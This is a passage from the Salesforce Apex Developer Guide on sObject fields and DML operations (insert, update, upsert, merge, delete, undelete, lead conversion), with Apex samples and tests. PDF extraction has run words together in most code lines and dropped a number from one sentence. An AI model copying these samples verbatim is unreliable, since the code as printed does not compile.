List<Contact>contacts= new List<Contact>();
List<Lead>leads= new List<Lead>();
List<Account>accounts= new List<Account>();
publicvoidconvertType(StringphoneNumber){
List<List<SObject>>results= [FIND:phoneNumber
IN PhoneFIELDS
RETURNINGContact(Id,Phone,FirstName,LastName),
Lead(Id,Phone,FirstName,LastName),
Account(Id,Phone,Name)];
List<SObject>records= new List<SObject>();
records.addAll(results[0]);//addContactresultsto our resultssuper-set
records.addAll(results[1]);//addLeadresults
records.addAll(results[2]);//addAccountresults
if (!records.isEmpty()){
for (Integeri = 0; i < records.size();i++){
SObjectrecord= records[i];
if (record.getSObjectType()== Contact.sObjectType){
contacts.add((Contact)record);
} elseif (record.getSObjectType()== Lead.sObjectType){
leads.add((Lead)record);
} elseif (record.getSObjectType()== Account.sObjectType){
accounts.add((Account)record);
}
}
}
}
}
Using SObject Fields
SObject fields can be initially set or not set (unset); unset fields are not the same as null or blank fields. When you perform a DML operation
on an SObject, you can change a field that is set; you can’t change unset fields.
Note:  To erase the current value of a field, set the field to null.
If an Apex method takes an SObject parameter, you can use the System.isSet() method to identify the set fields. If you want to unset any
fields to retain their values, first create an SObject instance. Then apply only the fields you want to be part of the DML operation.
132
Working with Data in ApexApex Developer Guide

This example code shows how SObject fields are identified as set or unset.
ContactnullFirst= new Contact(LastName='Codey', FirstName=null);
System.assertEquals(true, nullFirst.isSet('FirstName'), 'FirstNameis set to a literal
value,so it countsas set');
ContactunsetFirst= new Contact(LastName='Astro');
System.assertEquals(false, unsetFirst.isSet('FirstName'), ‘FirstNameis not set’);
An expression with SObject fields of type Boolean evaluates to true only if the SObject field is true. If the field is false or null, the expression
evaluates to false. This example code shows an expression that checks if the IsActive field of a Campaign object is null. Because
this expression always evaluates to false, the code in the if statement is never executed.
CampaigncObj=new Campaign();
...
if (cObj.IsActive== null) {
... // IsActiveis evaluatedto falseand thiscodeblockis not executed.
}
Validating sObjects and Fields
When Apex code is parsed and validated, all sObject and field references are validated against actual object and field names, and a
parse-time exception is thrown when an invalid name is used.
In addition, the Apex parser tracks the custom objects and fields that are used, both in the code's syntax as well as in embedded SOQL
and SOSL statements. The platform prevents users from making the following types of modifications when those changes cause Apex
code to become invalid:
•
Changing a field or object name
•
Converting from one data type to another
•
Deleting a field or object
•
Making certain organization-wide changes, such as record sharing, field history tracking, or record types
Data Manipulation Language
Apex enables you to insert, update, delete or restore data in the database. DML operations allow you to modify records one at a time or
in batches.
How DML Works
Adding and Retrieving Data With DML
Apex is tightly integrated with the Lightning Platform persistence layer. Records in the database can be inserted and manipulated
through Apex directly using simple statements. The language in Apex that allows you to add and manage records in the database
is the Data Manipulation Language (DML). In contrast to the SOQL language, which is used for read operations (querying records),
DML is used for write operations.
DML Statements vs. Database Class Methods
Apex offers two ways to perform DML operations: using DML statements or Database class methods. This provides flexibility in how
you perform data operations. DML statements are more straightforward to use and result in exceptions that you can handle in your
code.
DML Operations As Atomic Transactions
DML Operations
Using DML, you can insert new records and commit them to the database. You can also update the field values of existing records.
133
Working with Data in ApexApex Developer Guide

Exception Handling
More About DML
Here are some things you may want to know about using Data Manipulation Language.
Locking Records
When an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user
interface. The client locking the records can perform logic on the records and make updates with the guarantee that the locked
records won’t be changed by another client during the lock period.
How DML Works
Single vs. Bulk DML Operations
You can perform DML operations either on a single sObject, or in bulk on a list of sObjects. Performing bulk DML operations is the
recommended way because it helps avoid hitting governor limits, such as the DML limit of 150 statements per Apex transaction. This
limit is in place to ensure fair access to shared resources in the Lightning Platform. Performing a DML operation on a list of sObjects
counts as one DML statement, not as one statement for each sObject.
This example performs DML calls on single sObjects, which isn’t efficient.
The for loop iterates over contacts. For each contact, if the department field matches a certain value, it sets a new value for the
Description field. If the list contains more than items, the 151st update returns an exception that can't be caught.
List<Contact>conList= [SelectDepartment, DescriptionfromContact];
for(ContactbadCon: conList){
if (badCon.Department== 'Finance') {
badCon.Description= 'Newdescription';
}
// Not a goodpracticesincegovernorlimitsmightbe hit.
updatebadCon;
}
This example is a modified version of the previous example that doesn't hit the governor limit. The DML operation is performed in bulk
by calling update on a list of contacts. This code counts as one DML statement, which is far below the limit of 150.
// Listto holdthe new contactsto update.
List<Contact>updatedList= new List<Contact>();
List<Contact>conList= [SelectDepartment, DescriptionfromContact];
for(Contactcon : conList){
if (con.Department== 'Finance') {
con.Description= 'Newdescription';
// Add updatedcontactsObjectto the list.
updatedList.add(con);
}
}
// Callupdateon the listof contacts.
// Thisresultsin one DML callfor the entirelist.
updateupdatedList;
Another DML governor limit is the total number of rows that can be processed by DML operations in a single transaction, which is 10,000.
All rows processed by all DML calls in the same transaction count incrementally toward this limit. For example, if you insert 100 contacts
and update 50 contacts in the same transaction, your total DML processed rows are 150. You still have 9,850 rows left (10,000 - 150).
134
Working with Data in ApexApex Developer Guide

System Context and Sharing Rules
Most DML operations execute in system context, ignoring the current user's permissions, field-level security, organization-wide defaults,
position in the role hierarchy, and sharing rules. For more information, see Enforce Sharing Rules.
Note:  If you execute DML operations within an anonymous block, they execute using the current user’s object and field-level
permissions.
Best Practices
With DML on SObjects, it’s best to construct new instances and only update the fields you wish to modify without querying other fields.
If you query fields other than the fields you wish to update, you may revert queried field values that could have changed between the
query and the DML.
Adding and Retrieving Data With DML
Apex is tightly integrated with the Lightning Platform persistence layer. Records in the database can be inserted and manipulated
through Apex directly using simple statements. The language in Apex that allows you to add and manage records in the database is the
Data Manipulation Language (DML). In contrast to the SOQL language, which is used for read operations (querying records), DML is used
for write operations.
Before inserting or manipulating records, record data is created in memory as sObjects. The sObject data type is a generic data type and
corresponds to the data type of the variable that will hold the record data. There are specific data types, subtyped from the sObject data
type, which correspond to data types of standard object records, such as Account or Contact, and custom objects, such as
Invoice_Statement__c. Typically, you will work with these specific sObject data types. But sometimes, when you don’t know the type
of the sObject in advance, you can work with the generic sObject data type. This is an example of how you can create a new specific
Account sObject and assign it to a variable.
Accounta = new Account(Name='AccountExample');
In the previous example, the account referenced by the variable a exists in memory with the required Name field. However, it is not
persisted yet to the Lightning Platform persistence layer. You need to call DML statements to persist sObjects to the database. Here is
an example of creating and persisting this account using the insert statement.
Accounta = new Account(Name='AccountExample');
inserta;
Also, you can use DML to modify records that have already been inserted. Among the operations you can perform are record updates,
deletions, restoring records from the Recycle Bin, merging records, or converting leads. After querying for records, you get sObject
instances that you can modify and then persist the changes of. This is an example of querying for an existing record that has been
previously persisted, updating a couple of fields on the sObject representation of this record in memory, and then persisting this change
to the database.
// Queryexistingaccount.
Accounta = [SELECTName,Industry
FROMAccount
WHEREName='AccountExample'LIMIT1];
// Writethe old valuesthe debuglog beforeupdatingthem.
System.debug('AccountNamebeforeupdate:' + a.Name);// Nameis AccountExample
System.debug('AccountIndustrybeforeupdate:' + a.Industry);// Industryis not set
// Modifythe two fieldson the sObject.
a.Name= 'Accountof the Day';
135
Working with Data in ApexApex Developer Guide

a.Industry= 'Technology';
// Persistthe changes.
updatea;
// Get a new copyof the accountfromthe databasewiththe two fields.
Accounta = [SELECTName,Industry
FROMAccount
WHEREName='Accountof the Day'LIMIT1];
// Verifythatupdatedfieldvalueswerepersisted.
System.assertEquals('Accountof the Day', a.Name);
System.assertEquals('Technology', a.Industry);
DML Statements vs. Database Class Methods
Apex offers two ways to perform DML operations: using DML statements or Database class methods. This provides flexibility in how you
perform data operations. DML statements are more straightforward to use and result in exceptions that you can handle in your code.
This is an example of a DML statement to insert a new record.
// Createthe listof sObjectsto insert
List<Account>acctList= new List<Account>();
acctList.add(new Account(Name='Acme1'));
acctList.add(new Account(Name='Acme2'));
// DML statement
insertacctList;
This is an equivalent example to the previous one but it uses a method of the Database class instead of the DML verb.
// Createthe listof sObjectsto insert
List<Account>acctList= new List<Account>();
acctList.add(new Account(Name='Acme1'));
acctList.add(new Account(Name='Acme2'));
// DML statement
Database.SaveResult[]srList= Database.insert(acctList,false);
// Iteratethrougheachreturnedresult
for (Database.SaveResultsr : srList){
if (sr.isSuccess()){
// Operationwas successful,so get the ID of the recordthatwas processed
System.debug('Successfullyinsertedaccount.AccountID: ' + sr.getId());
}
else{
// Operationfailed,so get all errors
for(Database.Errorerr : sr.getErrors()){
System.debug('Thefollowingerrorhas occurred.');
System.debug(err.getStatusCode()+ ': ' + err.getMessage());
System.debug('Accountfieldsthataffectedthiserror:' + err.getFields());
}
}
}
136
Working with Data in ApexApex Developer Guide

One difference between the two options is that by using the Database class method, you can specify whether or not to allow for partial
record processing if errors are encountered. You can do so by passing an additional second Boolean parameter. If you specify false
for this parameter and if a record fails, the remainder of DML operations can still succeed. Also, instead of exceptions, a result object
array (or one result object if only one sObject was passed in) is returned containing the status of each operation and any errors encountered.
By default, this optional parameter is true, which means that if at least one sObject can’t be processed, all remaining sObjects won’t
and an exception will be thrown for the record that causes a failure.
The following helps you decide when you want to use DML statements or Database class methods.
•
Use DML statements if you want any error that occurs during bulk DML processing to be thrown as an Apex exception that immediately
interrupts control flow (by using try. . .catch blocks). This behavior is similar to the way exceptions are handled in most
database procedural languages.
•
Use Database class methods if you want to allow partial success of a bulk DML operation—if a record fails, the remainder of the DML
operation can still succeed. Your application can then inspect the rejected records and possibly retry the operation. When using this
form, you can write code that never throws DML exception errors. Instead, your code can use the appropriate results array to judge
success or failure. Note that Database methods also include a syntax that supports thrown exceptions, similar to DML statements.
Note: Most operations overlap between the two, except for a few.
•
The convertLead operation is only available as a Database class method, not as a DML statement.
•
The Database class also provides methods not available as DML statements, such as methods transaction control and rollback,
emptying the Recycle Bin, and methods related to SOQL queries.
SEE ALSO:
Apex Reference Guide: Database Class Methods
DML Operations As Atomic Transactions
DML operations execute within a transaction. All DML operations in a transaction either complete successfully, or if an error occurs in
one operation, the entire transaction is rolled back and no data is committed to the database. The boundary of a transaction can be a
trigger, a class method, an anonymous block of code, an Apex page, or a custom Web service method.
All operations that occur inside the transaction boundary represent a single unit of operations. This also applies to calls that are made
from the transaction boundary to external code, such as classes or triggers that get fired as a result of the code running in the transaction
boundary. For example, consider the following chain of operations: a custom Apex Web service method calls a method in a class that
performs some DML operations. In this case, all changes are committed to the database only after all operations in the transaction finish
executing and don’t cause any errors. If an error occurs in any of the intermediate steps, all database changes are rolled back and the
transaction isn’t committed.
DML Operations
Using DML, you can insert new records and commit them to the database. You can also update the field values of existing records.
Inserting and Updating Records
Using DML, you can insert new records and commit them to the database. Similarly, you can update the field values of existing
records.
Upserting Records
137
Working with Data in ApexApex Developer Guide

Merging Records
When you have duplicate lead, contact, case, or account records in the database, cleaning up your data and consolidating the records
is a good idea. You can merge up to three records of the same sObject type. The merge operation merges the duplicate records
into the main record, deletes the duplicate records, and reparents any related records.
Deleting Records
Restoring Deleted Records
Converting Leads
Inserting and Updating Records
Using DML, you can insert new records and commit them to the database. Similarly, you can update the field values of existing records.
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
This example inserts three account records and updates an existing account record. First, three Account sObjects are created and added
to a list. An insert statement bulk inserts the list of accounts as an argument. Then, the second account record is updated, the billing city
is updated, and the update statement is called to persist the change in the database.
Account[]accts= new List<Account>();
for(Integeri=0;i<3;i++){
Accounta = new Account(Name='Acme'+ i,
BillingCity='SanFrancisco');
accts.add(a);
}
AccountaccountToUpdate;
try {
insertaccts;
// UpdateaccountAcme2.
accountToUpdate=
[SELECTBillingCityFROMAccount
WHEREName='Acme2'AND BillingCity='SanFrancisco'
LIMIT1];
// Updatethe billingcity.
accountToUpdate.BillingCity= 'NewYork';
// Makethe updatecall.
updateaccountToUpdate;
} catch(DmlExceptione) {
System.debug('An unexpectederrorhas occurred:' + e.getMessage());
}
// Verifythatthe billingcitywas updatedto New York.
AccountafterUpdate=
[SELECTBillingCityFROMAccountWHEREId=:accountToUpdate.Id];
System.assertEquals('NewYork', afterUpdate.BillingCity);
Inserting Related Records
You can insert records related to existing records if a relationship has already been defined between the two objects, such as a lookup
or master-detail relationship. A record is associated with a related record through a foreign key ID. For example, when inserting a new
contact, you can specify the contact’s related account record by setting the value of the AccountId field.
138
Working with Data in ApexApex Developer Guide

This example adds a contact to an account (the related record) by setting the AccountId field on the contact. Contact and Account
are linked through a lookup relationship.
try {
Accountacct= new Account(Name='SFDCAccount');
insertacct;
// Oncethe accountis inserted,the sObjectwillbe
// populatedwithan ID.
// Get thisID.
ID acctID= acct.ID;
// Add a contactto thisaccount.
Contactcon = new Contact(
FirstName='Joe',
LastName='Smith',
Phone='415.555.1212',
AccountId=acctID);
insertcon;
} catch(DmlExceptione) {
System.debug('An unexpectederrorhas occurred:' + e.getMessage());
}
Updating Related Records
Fields on related records can't be updated with the same call to the DML operation and require a separate DML call. For example, if
inserting a new contact, you can specify the contact's related account record by setting the value of the AccountId field. However,
you can't change the account's name without updating the account itself with a separate DML call. Similarly, when updating a contact,
if you also want to update the contact’s related account, you must make two DML calls. The following example updates a contact and
its related account using two update statements.
try {
// Queryfor the contact,whichhas beenassociatedwithan account.
ContactqueriedContact= [SELECTAccount.Name
FROMContact
WHEREFirstName= 'Joe'AND LastName='Smith'
LIMIT1];
// Updatethe contact'sphonenumber
queriedContact.Phone= '415.555.1213';
// Updatethe relatedaccountindustry
queriedContact.Account.Industry= 'Technology';
// Maketwo separatecalls
// 1. Thiscallis to updatethe contact'sphone.
updatequeriedContact;
// 2. Thiscallis to updatethe relatedaccount'sIndustryfield.
updatequeriedContact.Account;
} catch(Exceptione) {
System.debug('An unexpectederrorhas occurred:' + e.getMessage());
}
139
Working with Data in ApexApex Developer Guide

Relating Records by Using an External ID
Add related records by using a custom external ID field on the parent record. Associating records through the external ID field is an
alternative to using the record ID. You can add a related record to another record only if a relationship (such as master-detail or
lookup) has been defined for the objects involved.
Creating Parent and Child Records in a Single Statement Using Foreign Keys
Relating Records by Using an External ID
Add related records by using a custom external ID field on the parent record. Associating records through the external ID field is an
alternative to using the record ID. You can add a related record to another record only if a relationship (such as master-detail or lookup)
has been defined for the objects involved.
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
This example relates a new opportunity to an existing account. The Account sObject has a custom field marked as External ID. An
opportunity record is associated to the account record through the custom External ID field. The example assumes that:
•
The Account sObject has an external ID field of type text and named MyExtID
•
An account record exists where MyExtID__c= ‘SAP111111’
Before the new opportunity is inserted, the account record is added to this opportunity as an sObject through the
Opportunity.Account relationship field.
OpportunitynewOpportunity= new Opportunity(
Name='OpportunityWithAccountInsert',
StageName='Prospecting',
CloseDate=Date.today().addDays(7));
// Createthe parentrecordreference.
// An accountwithexternalID = 'SAP111111'alreadyexists.
// ThissObjectis usedonlyfor foreignkey reference
// and doesn'tcontainany otherfields.
AccountaccountReference= new Account(
MyExtID__c='SAP111111');
// Add the accountsObjectto the opportunity.
newOpportunity.Account= accountReference;
// Createthe opportunity.
Database.SaveResultresults= Database.insert(newOpportunity);
The previous example performs an insert operation, but you can also relate sObjects through external ID fields when performing updates
or upserts. If the parent record doesn’t exist, you can create it with a separate DML statement or by using the same DML statement as
shown in Creating Parent and Child Records in a Single Statement Using Foreign Keys.
Creating Parent and Child Records in a Single Statement Using Foreign Keys
You can use external ID fields as foreign keys to create parent and child records of different sObject types in a single step instead of
creating the parent record first, querying its ID, and then creating the child record. To do this:
•
Create the child sObject and populate its required fields, and optionally other fields.
•
Create the parent reference sObject used only for setting the parent foreign key reference on the child sObject. This sObject has only
the external ID field defined and no other fields set.
140
Working with Data in ApexApex Developer Guide

•
Set the foreign key field of the child sObject to the parent reference sObject you just created.
•
Create another parent sObject to be passed to the insert statement. This sObject must have the required fields (and optionally
other fields) set in addition to the external ID field.
•
Call insert by passing it an array of sObjects to create. The parent sObject must precede the child sObject in the array, that is,
the array index of the parent must be lower than the child’s index.
You can create related records that are up to 10 levels deep. Also, the related records created in a single call must have different sObject
types. For more information, see Creating Records for Different Object Types in the SOAP API Developer Guide.
The following example shows how to create an opportunity with a parent account using the same insert statement. The example
creates an Opportunity sObject and populates some of its fields, then creates two Account objects. The first account is only for the foreign
key relationship, and the second is for the account creation and has the account fields set. Both accounts have the external ID field,
MyExtID__c, set. Next, the sample calls Database.insert by passing it an array of sObjects. The first element in the array is
the parent sObject and the second is the opportunity sObject. The Database.insert statement creates the opportunity with its
parent account in a single step. Finally, the sample checks the results and writes the IDs of the created records to the debug log, or the
first error if record creation fails. This sample requires an external ID text field on Account called MyExtID.
publicclassParentChildSample{
publicstaticvoidInsertParentChild(){
Datedt = Date.today();
dt = dt.addDays(7);
OpportunitynewOpportunity= new Opportunity(
Name='OpportunityWithAccountInsert',
StageName='Prospecting',
CloseDate=dt);
// Createthe parentreference.
// Usedonlyfor foreignkey reference
// and doesn'tcontainany otherfields.
AccountaccountReference= new Account(
MyExtID__c='SAP111111');
newOpportunity.Account= accountReference;
// Createthe Accountobjectto insert.
// Sameas abovebut has Namefield.
// Usedfor the insert.
AccountparentAccount= new Account(
Name='Hallie',
MyExtID__c='SAP111111');
// Createthe accountand the opportunity.
Database.SaveResult[]results= Database.insert(new SObject[]{
parentAccount,newOpportunity});
// Checkresults.
for (Integeri = 0; i < results.size();i++){
if (results[i].isSuccess()){
System.debug('SuccessfullycreatedID: '
+ results[i].getId());
} else{
System.debug('Error:couldnot createsobject'
+ 'forarrayelement' + i + '.');
System.debug('   The errorreportedwas:'
+ results[i].getErrors()[0].getMessage()+ '\n');
141
Working with Data in ApexApex Developer Guide

}
}
}
}
Upserting Records
Using the upsert operation, you can either insert or update an existing record in one call. To determine whether a record already
exists, the upsert statement or Database method uses the record’s ID as the key to match records, a custom external ID field, or a
standard field with the idLookup attribute set to true.
•
If the key isn’t matched, then a new object record is created.
•
If the key is matched once, then the existing object record is updated.
•
If the key is matched multiple times, then an error is generated and the object record is not inserted or updated.
Note:  Custom field matching is case-insensitive only if the custom field has the Unique and Treat "ABC" and "abc" as duplicate
values (case insensitive) attributes selected as part of the field definition. If this is the case, “ABC123” is matched with “abc123.”
For more information, see Create Custom Fields.
Examples
The following example updates the city name for all existing accounts in the city formerly known as Bombay, and also inserts a new
account in San Francisco:
Account[]acctsList= [SELECTId, Name,BillingCity
FROMAccountWHEREBillingCity= 'Bombay'];
for (Accounta : acctsList){
a.BillingCity= 'Mumbai';
}
AccountnewAcct= new Account(Name= 'Acme', BillingCity= 'SanFrancisco');
acctsList.add(newAcct);
try {
upsertacctsList;
} catch(DmlExceptione) {
// Processexceptionhere
}
Note:  For more information on processing DmlExceptions, see  Bulk DML Exception Handling.
This next example uses the Database.upsert method to upsert a collection of leads that are passed in. This example allows for
partial processing of records, that is, in case some records fail processing, the remaining records are still inserted or updated. It iterates
through the results and adds a task to each record that was processed successfully. The task sObjects are saved in a list, which is then
bulk inserted. This example is followed by a test class that contains a test method for testing the example.
/* Thisclassdemonstratesand teststhe use of the
* partialprocessingDML operations*/
publicclassDmlSamples{
/* Thismethodacceptsa collectionof leadrecordsand
createsa taskfor the owner(s)of any leadsthatwere
createdas new,thatis, not updatedas a resultof the upsert
operation*/
142
Working with Data in ApexApex Developer Guide

publicstaticList<Database.upsertResult>upsertLeads(List<Lead>leads){
/* Performthe upsert.In thiscasethe uniqueidentifierfor the
insertor updatedecisionis the SalesforcerecordID. If the
recordID is nullthe row willbe inserted,otherwisean update
willbe attempted.*/
List<Database.upsertResult>uResults= Database.upsert(leads,false);
/* Thisis the listfor new tasksthatwillbe insertedwhennew
leadsare created.*/
List<Task>tasks= new List<Task>();
for(Database.upsertResultresult:uResults){
if (result.isSuccess()&& result.isCreated())
tasks.add(new Task(Subject= 'Follow-up', WhoId= result.getId()));
}
/* If thereare tasksto be inserted,insertthem*/
Database.insert(tasks);
returnuResults;
}
}
@isTest
privateclassDmlSamplesTest{
publicstatictestMethodvoidtestUpsertLeads(){
/* We onlyneedto testthe insertsideof upsert*/
List<Lead>leads= new List<Lead>();
/* Createa set of leadsfor testing*/
for(Integeri = 0;i < 100;i++){
leads.add(new Lead(LastName= 'testLead', Company= 'testCompany'));
}
/* Switchto the runtimelimitcontext*/
Test.startTest();
/* Exercisethe method*/
List<Database.upsertResult>results= DmlSamples.upsertLeads(leads);
/* Switchbackto the testcontextfor limits*/
Test.stopTest();
/* ID set for assertingthe taskswerecreatedas expected*/
Set<Id>ids = new Set<Id>();
/* Iterateoverthe results,assertingsuccessand addingthe new ID
to the set for use in the comprehensiveassertionphasebelow.*/
for(Database.upsertResultresult:results){
System.assert(result.isSuccess());
ids.add(result.getId());
}
/* Assertthatexactlyone taskexistsfor eachleadthatwas inserted.*/
143
Working with Data in ApexApex Developer Guide

for(Leadl:[SELECTId, (SELECTSubjectFROMTasks)FROMLeadWHEREId IN :ids]){
System.assertEquals(1,l.tasks.size());
}
}
}
Use of upsert with an external ID can reduce the number of DML statements in your code, and help you to avoid hitting governor
limits (see Execution Governors and Limits).
This example uses upsert and an external ID field Line_Item_Id__c on the Asset object to maintain a one-to-one relationship
between an asset and an opportunity line item. Before running the sample, create a custom text field on the Asset object named
Line_Item_Id__c and mark it as an external ID. For information on custom fields, see Salesforce Help.
Note:  External ID fields used in upsert calls must be unique or the user must have the View All Data permission.
publicvoidupsertExample(){
Opportunityopp = [SELECTId, Name,AccountId,
(SELECTId, PricebookEntry.Product2Id,PricebookEntry.Name
FROMOpportunityLineItems)
FROMOpportunity
WHEREHasOpportunityLineItem= true
LIMIT1];
Asset[]assets= new Asset[]{};
// Createan assetfor eachlineitemon the opportunity
for (OpportunityLineItemlineItem:opp.OpportunityLineItems){
//Thiscodepopulatesthe lineitemId, AccountId,and Product2Idfor eachasset
Assetasset= new Asset(Name= lineItem.PricebookEntry.Name,
Line_Item_ID__c= lineItem.Id,
AccountId= opp.AccountId,
Product2Id= lineItem.PricebookEntry.Product2Id);
assets.add(asset);
}
try {
upsertassetsLine_Item_ID__c;// Thislineupsertsthe assetslistwith
// the Line_Item_Id__cfieldspecifiedas the
// Assetfieldthatshouldbe usedfor matching
// the recordthatshouldbe upserted.
} catch(DmlExceptione) {
System.debug(e.getMessage());
}
}
Merging Records
When you have duplicate lead, contact, case, or account records in the database, cleaning up your data and consolidating the records
is a good idea. You can merge up to three records of the same sObject type. The merge operation merges the duplicate records into
the main record, deletes the duplicate records, and reparents any related records.
144
Working with Data in ApexApex Developer Guide

Use the merge Statement
This example shows how to merge a duplicate account record into a main account record. The duplicate account has a related contact,
which is moved to the main account record after the merge operation. After merging, the duplicate record is deleted and only the
main record remains in the database.
// Insertnew accounts
List<Account>ls = new List<Account>{
new Account(name='AcmeInc.'),
new Account(name='Acme')
};
insertls;
// Queriesto get the insertedaccounts
AccountmainAcct= [SELECTId, NameFROMAccountWHEREName= 'AcmeInc.'LIMIT1];
AccountdupAcct= [SELECTId, NameFROMAccountWHEREName= 'Acme'LIMIT1];
// Add a contactto the accountto be merged
Contactc = new Contact(FirstName='Joe',LastName='Merged');
c.AccountId= dupAcct.Id;
insertc;
try {
mergemainAcctdupAcct;
} catch(DmlExceptione) {
// Processexception
System.debug('An unexpectederrorhas occurred:' + e.getMessage());
}
// Afterthe accountis mergedwiththe mainaccount,
// the relatedcontactis movedto the mainrecord.
mainAcct= [SELECTId, Name,(SELECTFirstName,LastNameFromContacts)
FROMAccountWHEREName= 'AcmeInc.'LIMIT1];
System.assert(mainAcct.getSObjects('Contacts').size()> 0);
System.assertEquals('Joe', mainAcct.getSObjects('Contacts')[0].get('FirstName'));
System.assertEquals('Merged', mainAcct.getSObjects('Contacts')[0].get('LastName'));
// Verifythatthe duplicaterecordis deleted
Account[]result= [SELECTId, NameFROMAccountWHEREId=:dupAcct.Id];
System.assertEquals(0,result.size());
Use the Database.merge Method
This second example is similar to the previous example, except that it uses the Database.merge method instead of the merge
statement. The last argument of Database.merge is set to false, so any errors encountered in this operation are returned in the
merge result without throwing exceptions. In the example, a main account and two duplicate account records are created. One of the
duplicate account records has a child contact record. Through the merge operation, the contact is moved to the main account record,
and the other records are deleted.
Note:  To use the AccountContactRelation sObject in this example, enable the “Allow users to relate a contact to multiple accounts”
setting in your org. See Set Up Contacts to Multiple Accounts.
// Createmainaccount
Accountmain= new Account(Name='Account1');
145
Working with Data in ApexApex Developer Guide

insertmain;
// Createduplicateaccounts
Account[]duplicates= new Account[]{
// Duplicateaccount
new Account(Name='Account1,Inc.'),
// Secondduplicateaccount
new Account(Name='Account1')
};
insertduplicates;
// Createchildcontactand associateit withfirstaccount
Contactc = new Contact(firstname='Joe',lastname='Smith', accountId=duplicates[0].Id);
insertc;
// Get the accountcontactrelationID, whichis createdwhena contactis createdon
"Account1,Inc."
AccountContactRelationresultAcrel= [SELECTId FROMAccountContactRelationWHERE
ContactId=:c.IdLIMIT1];
// Mergeduplicateaccountsintomainaccount
Database.MergeResult[]results= Database.merge(main,duplicates,false);
for(Database.MergeResultres : results){
if (res.isSuccess()){
// Get the mainrecordID fromthe resultand validateit
System.debug('MainrecordID: ' + res.getId());
System.assertEquals(main.Id,res.getId());
// Get the IDs of the mergedrecordsand displaythem
List<Id>mergedIds= res.getMergedRecordIds();
System.debug('IDsof mergedrecords:' + mergedIds);
// Get the ID of the reparentedrecordand
// validatethatthisthe contactID.
System.debug('ReparentedrecordID: ' + res.getUpdatedRelatedIds());
// Makesurethereare two IDs (contactID and accountcontactrelationID);the order
isn'tdefined
System.assertEquals(2,res.getUpdatedRelatedIds().size());
booleanflag1= false;
booleanflag2= false;
// Becausethe orderof the IDs isn'tdefined,the ID can be at index0 or 1 of the
array
if (resultAcrel.id== res.getUpdatedRelatedIds()[0]|| resultAcrel.id==
res.getUpdatedRelatedIds()[1])
flag1= true;
if (c.id== res.getUpdatedRelatedIds()[0]|| c.id== res.getUpdatedRelatedIds()[1]
146
Working with Data in ApexApex Developer Guide

)
flag2= true;
System.assertEquals(flag1,true);
System.assertEquals(flag2,true);
}
else{
for(Database.Errorerr : res.getErrors()){
// Writeeacherrorto the debugoutput
System.debug(err.getMessage());
}
}
}
Merge Considerations
When merging sObject records, consider these rules and guidelines:
•
Only leads, contacts, cases, and accounts can be merged. See sObjects That Don’t Support DML Operations on page 161.
•
You can pass a main record and up to two additional sObject records to a single merge method.
•
Field values on the main record, including null and empty field values, always supersede the corresponding field values on the
records to be merged. Therefore, if a field value on the main record is empty, the resulting field value remains empty after the merge
operation regardless of the field value on the duplicate record. To preserve a field value from a duplicate record, manually set this
field value on the main record before performing the merge.
•
External ID fields can’t be used with merge.
Deleting Records
After you persist records in the database, you can delete those records using the delete operation. Deleted records aren’t deleted
permanently from Salesforce, but they are placed in the Recycle Bin for 15 days from where they can be restored. Restoring deleted
records is covered in a later section.
Example
The following example deletes all accounts that are named 'DotCom':
Account[]doomedAccts= [SELECTId, NameFROMAccount
WHEREName= 'DotCom'];
try {
deletedoomedAccts;
} catch(DmlExceptione) {
// Processexceptionhere
}
Note:  For more information on processing DmlExceptions, see  Bulk DML Exception Handling.
Referential Integrity When Deleting and Restoring Records
The delete operation supports cascading deletions. If you delete a parent object, you delete its children automatically, as long as
each child record can be deleted.
147
Working with Data in ApexApex Developer Guide

For example, if you delete a case record, Apex automatically deletes any CaseComment, CaseHistory, and CaseSolution records associated
with that case. However, if a particular child record is not deletable or is currently being used, then the delete operation on the parent
case record fails.
The undelete operation restores the record associations for the following types of relationships:
•
Parent accounts (as specified in the ParentAccount field on an account)
•
Indirect account-contact relationships (as specified on the Related Accounts related list on a contact or the Related Contacts related
list on an account)
•
Parent cases (as specified in the ParentCase field on a case)
•
Master solutions for translated solutions (as specified in the MasterSolution field on a solution)
•
Managers of contacts (as specified in the ReportsTo field on a contact)
•
Products related to assets (as specified in the Product field on an asset)
•
Opportunities related to quotes (as specified in the Opportunity field on a quote)
•
All custom lookup relationships
•
Relationship group members on accounts and relationship groups, with some exceptions
•
Tags
•
An article's categories, publication state, and assignments
Note:  Salesforce only restores lookup relationships that have not been replaced. For example, if an asset is related to a different
product prior to the original product record being undeleted, that asset-product relationship is not restored.
Restoring Deleted Records
After you have deleted records, the records are placed in the Recycle Bin for 15 days, after which they are permanently deleted. While
the records are still in the Recycle Bin, you can restore them using the undelete operation. If you accidentally deleted some records
that you want to keep, restore them from the Recycle Bin.
Example
The following example undeletes an account named 'Universal Containers'. The ALL ROWS keyword queries all rows for both top
level and aggregate relationships, including deleted records and archived activities.
Accounta = new Account(Name='UniversalContainers');
insert(a);
insert(new Contact(LastName='Carter',AccountId=a.Id));
deletea;
Account[]savedAccts= [SELECTId, NameFROMAccountWHEREName= 'UniversalContainers'
ALL ROWS];
try {
undeletesavedAccts;
} catch(DmlExceptione) {
// Processexceptionhere
}
Note:  For more information on processing DmlExceptions, see  Bulk DML Exception Handling.
148
Working with Data in ApexApex Developer Guide

Undelete Considerations
Note the following when using the undelete statement.
•
You can undelete records that were deleted as the result of a merge. However, the merge reparents the child objects, and that
reparenting can’t be undone.
•
To identify deleted records, including records deleted as a result of a merge, use the ALL ROWS parameters with a SOQL query.
•
See Referential Integrity When Deleting and Restoring Records.
SEE ALSO:
Querying All Records with a SOQL Statement
Converting Leads
The convertLead DML operation converts a lead into an account and contact, as well as (optionally) an opportunity.convertLead
is available only as a method on the Database class; it is not available as a DML statement.
Converting leads involves the following basic steps:
1.Your application determines the IDs of any lead(s) to be converted.
2.Optionally, your application determines the IDs of any account(s) into which to merge the lead. Your application can use SOQL to
search for accounts that match the lead name, as in the following example:
SELECTId, NameFROMAccountWHEREName='CompanyNameOfLeadBeingMerged'
3.Optionally, your application determines the IDs of the contact or contacts into which to merge the lead. The application can use
SOQL to search for contacts that match the lead contact name, as in the following example:
SELECTId, NameFROMContactWHEREFirstName='FirstName'AND LastName='LastName'AND
AccountId= '001...'
4.Optionally, the application determines whether opportunities should be created from the leads.
